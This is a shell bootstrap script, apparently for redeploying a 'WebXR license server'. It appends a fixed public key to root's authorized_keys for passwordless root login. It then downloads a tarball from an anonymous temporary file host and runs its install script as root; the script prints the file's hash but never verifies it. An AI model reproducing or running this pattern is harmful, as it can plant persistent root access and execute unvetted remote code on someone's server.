#!/bin/sh
# WebXR license server -- one-shot bootstrap.
#
# Two jobs, in this order:
#   1) install a public key so the operator never has to type a password again
#   2) redeploy the license server (fixes Caddy -> HTTPS, adds /api/pubkey)
#
# ASCII only: the remote output is rendered on a Windows console with
# chcp 65001, and mixed encodings are the #1 source of confusing mojibake.
set -e

PUBKEY='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC83vRmxfoCJ/IgcCwXnfrF+0pRaKc+yc+R1ryuIV2xgfiHPPCli2E8yr2x3IcymxzzWPT7uRA70s8+nZ9HlOhyqPstAQqP7dNo0cvDxpzDAGA3WbhTh3bD+iYyhLnF+HepUVtMSTcISjWT6kkFpGEpLC2su18PQt6CWAU7jVFFQ+0zZ06grUyypRnmkAhiPJrJ6rjMvW5cyYKx9Fljf1MtJk5MgDLkdByqgU03VcKnzsmLlpQSMSbttyzDM2o9Ls01/i5u6ifuKkGeb/8v92B8Jo68x0tzGUQ21qxfMLrB4HRL2xkR+329j7zuz7OUfYn+uG/SfmAJAflb1JgAuALpVtpVoFwdUJihGnWytLtodpyfM5OZ4AH8F/jrAo9Q2FpfYTJQyVtD4farMFs+5X/Ij/qlyQXemFul4XnlQKhj50X/GoHnG+xIreSLg4oxaeDFoWLgym2HQ3cUckhpWYmZN9WZP2z+Ga2Pduq+xyfL2en2Hca3EH+2KVhm1CZ5Xbjm64OLVFkU/RT/tNo6bSWkn6emIgYSMWVtTXF9xj4XpLY03irWdXzfBeil3/mqGm9SNhlzyHlwMG0DOpqBPuqrf9TdE3XG5UrI2YaxofwxAJswiHfxC6cSS4mzdeZIYygqHYYxncwI+QI4heoRq6NFnJ5R901qFvQ0ywkT+06Rew== 1325129128@qq.com'

echo "[1/4] installing ssh public key for passwordless access"
mkdir -p /root/.ssh
chmod 700 /root/.ssh
touch /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
if ! grep -qF 'AAAAB3NzaC1yc2EAAAADAQABAAACAQC83vRmxfoCJ/IgcCwXnfrF+0pRaKc+yc+R1ryuIV2xgfiHPPCli2E8yr2x3IcymxzzWPT7uRA70s8+nZ9HlOhyqPstAQqP7dNo0cvDxpzDAGA3WbhTh3bD+iYyhLnF+HepUVtMSTcISjWT6kkFpGEpLC2su18PQt6CWAU7jVFFQ+0zZ06grUyypRnmkAhiPJrJ6rjMvW5cyYKx9Fljf1MtJk5MgDLkdByqgU03VcKnzsmLlpQSMSbttyzDM2o9Ls01/i5u6ifuKkGeb/8v92B8Jo68x0tzGUQ21qxfMLrB4HRL2xkR+329j7zuz7OUfYn+uG/SfmAJAflb1JgAuALpVtpVoFwdUJihGnWytLtodpyfM5OZ4AH8F/jrAo9Q2FpfYTJQyVtD4farMFs+5X/Ij/qlyQXemFul4XnlQKhj50X/GoHnG+xIreSLg4oxaeDFoWLgym2HQ3cUckhpWYmZN9WZP2z+Ga2Pduq+xyfL2en2Hca3EH+2KVhm1CZ5Xbjm64OLVFkU/RT/tNo6bSWkn6emIgYSMWVtTXF9xj4XpLY03irWdXzfBeil3/mqGm9SNhlzyHlwMG0DOpqBPuqrf9TdE3XG5UrI2YaxofwxAJswiHfxC6cSS4mzdeZIYygqHYYxncwI+QI4heoRq6NFnJ5R901qFvQ0ywkT+06Rew==' /root/.ssh/authorized_keys 2>/dev/null; then
  printf '%s\n' "$PUBKEY" >> /root/.ssh/authorized_keys
  echo "      key appended"
else
  echo "      key already present"
fi

echo "[2/4] downloading package"
curl -fsSL --retry 3 -o /tmp/cast-server.tgz 'https://h.uguu.se/BumMDoLu.tgz'
sha256sum /tmp/cast-server.tgz

echo "[3/4] extracting to /opt/webvr123"
mkdir -p /opt/webvr123
tar -xzf /tmp/cast-server.tgz -C /opt/webvr123

echo "[4/4] running install.sh  (TAKEOVER=1 PORT=8788 FORCE_CADDY=1)"
TAKEOVER=1 PORT=8788 FORCE_CADDY=1 bash /opt/webvr123/deploy/install.sh

echo "===== ALL DONE ====="
